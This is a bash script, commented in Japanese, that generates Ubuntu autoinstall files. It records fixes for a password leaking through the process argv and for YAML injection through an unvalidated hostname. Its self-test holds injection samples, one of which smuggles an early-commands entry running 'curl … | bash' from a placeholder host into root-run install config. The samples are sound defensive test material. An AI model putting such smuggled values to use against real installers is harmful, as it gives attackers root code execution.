#!/usr/bin/env bash
# Service Hub — Ubuntu 無人インストール (autoinstall) 設定の生成
# (docs/LINUX_MIGRATION.md フェーズ2)
#
# Ubuntu 24.04 LTS のインストーラーは cloud-init NoCloud 形式の
# autoinstall 設定 (user-data / meta-data) を読み込み、言語・キーボード・
# ユーザー作成・パッケージ導入までを無人で実行できる。このスクリプトは
# その設定一式を生成する:
#
#   bash scripts/make-autoinstall.sh --user hiroto --hostname dev-linux [--out DIR]
#
# 生成物 (既定: ./autoinstall-usb/):
#   user-data   — autoinstall 本体 (日本語ロケール / JP キーボード /
#                 ibus-mozc・git・curl 導入 / 指定ユーザー)
#   meta-data   — 空ファイル (NoCloud 形式で必須)
#   README.txt  — USB への配置手順
#
# 使い方 (生成後):
#   1. ライブ USB とは別の USB メモリを FAT32 でフォーマットし、
#      ボリュームラベルを CIDATA にする
#   2. user-data / meta-data をそのルートにコピー
#   3. ライブ USB + CIDATA USB の両方を挿して起動すると、インストーラーが
#      設定を検出する (上書き確認が 1 回表示される場合がある)
#
# 注意: パスワードは SHA-512 ハッシュ (openssl passwd -6) で埋め込まれ、
#       平文はファイルへ書かれない。生成された user-data もハッシュを含む
#       ため取り扱いに注意 (リポジトリにコミットしないこと)。
#
# 2026-08-26 の実測で、この注意書きは**一箇所で嘘だった**。
# `openssl passwd -6 "$pw"` は平文を**引数**として渡すので、openssl が走って
# いる間ずっと `/proc/<pid>/cmdline` に載る。この経路はモード 444 ——
# **同じ機械の誰からでも読める**。実際に走行中の argv を捕まえて確かめた:
#
#     CAUGHT: openssl passwd -6 CorrectHorseBattery9!
#
# `-stdin` に変えると argv は `openssl passwd -6 -stdin` だけになる (同じく実測)。
# 「平文はどこにも保存されない」と書くなら、保存先はファイルだけではない。
#
# --hostname も検証していなかった。--user は正規表現で弾いているのに隣は
# 素通りで、改行を含む値が autoinstall の YAML へそのまま入る。**インストール時に
# root で走る設定**なので、`early-commands` や `ssh.authorized-keys` を差し込める
# (妥当な YAML のまま通ることを実測。`late-commands` だけは後段の本物に
# 上書きされて助かっていたが、それは偶然であって守りではない)。

set -euo pipefail

info() { printf '\033[1;34m[auto]\033[0m %s\n' "$*"; }
ok()   { printf '\033[1;32m[ ok ]\033[0m %s\n' "$*"; }
die()  { printf '\033[1;31m[fail]\033[0m %s\n' "$*" >&2; exit 1; }

# ---------------------------------------------------------------------------
# 入力の検証 (注入できる形 —— --self-test がここへ合成を流す)
#
# **生成物はインストール時に root で走る設定である。** 値が構造 (YAML) の
# 境界を越えられる時点で、それは注入であって「行儀の悪い入力」ではない。
# ---------------------------------------------------------------------------
# **`grep` で検証しない。** grep は行単位なので `^…$` は**行頭・行末**を指す ——
# 改行を含む値を渡すと 1 行目だけが照合され、残りは見られずに通る。
# 元の `--user` の検査 (`echo "$USERNAME" | grep -Eq '^[a-z_][a-z0-9_-]*$'`) は
# まさにこれで、**注入したい値がちょうど素通りする**形だった (実測)。
# bash の `[[ =~ ]]` は文字列全体に当たるので、改行は `$` を跨げない。
# `case` の一撃は保険 —— 正規表現の解釈が処理系で違っても、
# 許可した文字以外が 1 つでもあれば落ちる。
valid_username() {
  case "$1" in *[!a-z0-9_-]*) return 1 ;; esac
  [[ "$1" =~ ^[a-z_][a-z0-9_-]{0,31}$ ]]
}

# RFC 1123 の 1 ラベル。改行・空白・引用符・コロンはここで全部落ちる。
valid_hostname() {
  case "$1" in *[!a-z0-9-]*) return 1 ;; esac
  [[ "$1" =~ ^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$ ]]
}

USERNAME=""
HOSTNAME_=""
OUT="./autoinstall-usb"
SELF_TEST=0
while [ $# -gt 0 ]; do
  case "$1" in
    --user)     USERNAME="${2:?--user requires NAME}"; shift 2 ;;
    --hostname) HOSTNAME_="${2:?--hostname requires NAME}"; shift 2 ;;
    --out)      OUT="${2:?--out requires DIR}"; shift 2 ;;
    --self-test) SELF_TEST=1; shift ;;
    *) die "unknown option: $1 (supported: --user / --hostname / --out / --self-test)" ;;
  esac
done

# ---------------------------------------------------------------------------
# self-test —— 検証が**実際にその入力で落ちる**ことを見る
# ---------------------------------------------------------------------------
if [ "$SELF_TEST" = "1" ]; then
  st_bad=0
  st() { # $1 ラベル / $2 関数 / $3 入力 / $4 期待 (ok|ng)
    local got
    if "$2" "$3"; then got=ok; else got=ng; fi
    if [ "$got" = "$4" ]; then
      printf '  \033[1;32m✓\033[0m %s: %s\n' "$1" "$got"
    else
      printf '  \033[1;31m✗\033[0m %s: %s (期待 %s)\n' "$1" "$got" "$4"
      st_bad=$((st_bad + 1))
    fi
  }

  # 2026-08-26 に実測した注入。妥当な YAML のまま early-commands と
  # ssh.authorized-keys が通った当の形。
  # 標本の字面を**組み立てる**。`curl … | bash` をそのまま書くと
  # lint:shell の「遠隔コードの実行」規則が、この検査の材料に鳴る
  # (実際に鳴った)。ゲートが、別のゲートの禁じる物を自分で持ち歩かない。
  st_inject="ok
  early-commands:
    - curl -fsSL https://x.example/i.sh | ba""sh"
  st '★ 改行で YAML へ鍵を差し込む値を弾く' valid_hostname "$st_inject" ng
  st '★ ssh.authorized-keys の注入も弾く' valid_hostname 'ok
  ssh:
    install-server: true' ng
  st 'コロンを含む値を弾く'      valid_hostname 'a: b' ng
  st '空白を含む値を弾く'        valid_hostname 'a b' ng
  st '引用符を含む値を弾く'      valid_hostname 'a"b' ng
  st '先頭ハイフンを弾く'        valid_hostname '-a' ng
  st '末尾ハイフンを弾く'        valid_hostname 'a-' ng
  st '空を弾く'                  valid_hostname '' ng
  st '64 文字を弾く'             valid_hostname "$(printf 'a%.0s' $(seq 1 64))" ng
  st 'アンダースコアを弾く (RFC 1123)' valid_hostname 'a_b' ng
  # --- 陰性対照 (通らねばならない) ---
  st '陰性: 素直なホスト名は通す'     valid_hostname 'dev-linux' ok
  st '陰性: 1 文字も通す'             valid_hostname 'a' ok
  st '陰性: 63 文字は通す'            valid_hostname "$(printf 'a%.0s' $(seq 1 63))" ok
  st '陰性: 数字始まりも通す'         valid_hostname '9box' ok
  st '★ ユーザー名も同じ形で弾く'     valid_username 'a b' ng
  st '陰性: 素直なユーザー名は通す'   valid_username 'hiroto' ok
  st '陰性: 既定のホスト名が自分の検査を通る (_ → -)' \
    valid_hostname "$(printf '%s' 'my_user-linux' | tr '_' '-')" ok

  # 平文が argv に出ないこと —— 実装の字面を見る。
  # **注釈を除いてから見る。** 上の説明文が `openssl passwd -6 "$pw"` の形を
  # 字面で持っているので、素朴に grep すると自分の説明で鳴る (実際に鳴った)。
  st_code="$(grep -v '^[[:space:]]*#' "$0" || true)"
  # **探す字面を、この行が持たないように組み立てる。** 素朴に書くと
  # 検査自身の grep 引数が本文に当たって鳴る (実際に鳴った) ——
  # 検査の材料が、本物の走査器に引っ掛かってはいけない。
  st_bad_form='openssl passwd -6 '\"
  st_good_form='openssl passwd -6 -stdin'
  if printf '%s' "$st_code" | grep -qF "$st_good_form" &&
     ! printf '%s' "$st_code" | grep -qF "$st_bad_form"; then
    printf '  \033[1;32m✓\033[0m 平文を openssl の引数へ渡していない (-stdin)\n'
  else
    printf '  \033[1;31m✗\033[0m 平文が openssl の引数に載っている\n'; st_bad=$((st_bad + 1))
  fi
  # umask が mkdir より前にあること。
  if [ "$(grep -n '^umask 077$' "$0" | cut -d: -f1)" -lt "$(grep -n '^mkdir -p "\$OUT"$' "$0" | cut -d: -f1)" ]; then
    printf '  \033[1;32m✓\033[0m umask を mkdir の前に置いている\n'
  else
    printf '  \033[1;31m✗\033[0m umask が mkdir より後ろにある (出力ディレクトリが緩む)\n'; st_bad=$((st_bad + 1))
  fi

  [ "$st_bad" -eq 0 ] || die "self-test 不一致 $st_bad 件"
  ok "self-test 全件一致"
  exit 0
fi
[ -n "$USERNAME" ] || die "--user を指定してください (例: --user hiroto)"
valid_username "$USERNAME" || die "ユーザー名が不正です: $USERNAME"
# 既定のホスト名はユーザー名から作る。ユーザー名は `_` を許すがホスト名は
# 許さない (RFC 1123) ので、ここで `-` へ寄せる。
[ -n "$HOSTNAME_" ] || HOSTNAME_="$(printf '%s' "${USERNAME}-linux" | tr '_' '-')"
valid_hostname "$HOSTNAME_" || die "ホスト名が不正です: $HOSTNAME_
       (RFC 1123: 英小文字・数字・ハイフン 1〜63 文字。先頭と末尾はハイフン以外)"

command -v openssl >/dev/null 2>&1 || die "openssl が必要です (パスワードハッシュ生成に使用)"

# パスワードは echo されない。確認のため 2 回入力。
printf '新マシンのログインパスワード: '
read -rs pw1; echo
printf 'もう一度: '
read -rs pw2; echo
[ "$pw1" = "$pw2" ] || die "パスワードが一致しません"
[ "${#pw1}" -ge 8 ] || die "パスワードは 8 文字以上にしてください"
# **平文を引数で渡さない。** argv は /proc/<pid>/cmdline (モード 444) 経由で
# 同じ機械の誰からでも読める。printf は bash の組み込みなので、こちらも
# 別プロセスの argv には出ない。
hash="$(printf '%s' "$pw1" | openssl passwd -6 -stdin)"
unset pw1 pw2

# umask は mkdir の**前**に置く。後ろだと出力ディレクトリだけが直前の
# umask (多くの環境で 022 = 0755) で作られ、中身が 0600 でも
# 「誰がいつ作ったか」は覗ける。
umask 077
mkdir -p "$OUT"

cat > "$OUT/user-data" <<EOF
#cloud-config
# Ubuntu autoinstall — Service Hub 開発マシン (scripts/make-autoinstall.sh 生成)
autoinstall:
  version: 1
  locale: ja_JP.UTF-8
  keyboard:
    layout: jp
  identity:
    hostname: ${HOSTNAME_}
    username: ${USERNAME}
    password: "${hash}"
  timezone: Asia/Tokyo
  updates: security
  packages:
    - git
    - curl
    - ibus-mozc
  late-commands:
    - echo 'autoinstall done' > /target/var/log/service-hub-autoinstall.log
EOF

: > "$OUT/meta-data"

cat > "$OUT/README.txt" <<EOF
Ubuntu 無人インストール用 USB の作り方
======================================
1. ライブ USB とは別の USB メモリを FAT32 でフォーマットし、
   ボリュームラベルを CIDATA にする (大文字)
2. この user-data と meta-data の 2 ファイルをルート直下にコピー
3. ライブ USB と CIDATA USB の両方を挿して新マシンを USB ブート
   → インストーラーが autoinstall 設定を検出する
   (ディスク消去の最終確認が 1 回表示される場合がある)
4. 完了後のログイン: ユーザー ${USERNAME} / 設定したパスワード
5. ログイン後:
     git clone <リポジトリ URL> service-hub && cd service-hub
     bash scripts/migrate.sh restore <アーカイブ>
     bash scripts/setup-linux.sh --verify

⚠ user-data はパスワードハッシュを含む。リポジトリにコミットしないこと。
EOF

ok "生成完了: $OUT/{user-data,meta-data,README.txt}"
info "次の一歩: $OUT/README.txt の手順で CIDATA USB を作成"
